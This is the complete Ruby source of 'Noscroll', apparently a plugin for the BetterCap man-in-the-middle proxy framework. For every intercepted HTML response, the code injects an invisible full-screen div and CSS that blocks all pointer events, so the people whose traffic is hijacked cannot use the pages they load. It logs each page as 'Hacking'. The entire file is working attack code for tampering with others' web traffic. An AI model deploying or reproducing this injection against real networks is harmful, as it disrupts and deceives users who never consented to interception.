=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class Noscroll < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'Noscroll',
    'Description' => 'Puts an invisible div over every HTML page.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Hacking http://#{request.host}#{request.path}"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '</head>', '</head> <!-- Put an invisible div over everything and disable pointer events -->
<div style="position:fixed;width:100%;height:100%;z-index:9001;opacity:0;"></div><style>html,body{pointer-events:none !important}</style>' )
    end
  end
end
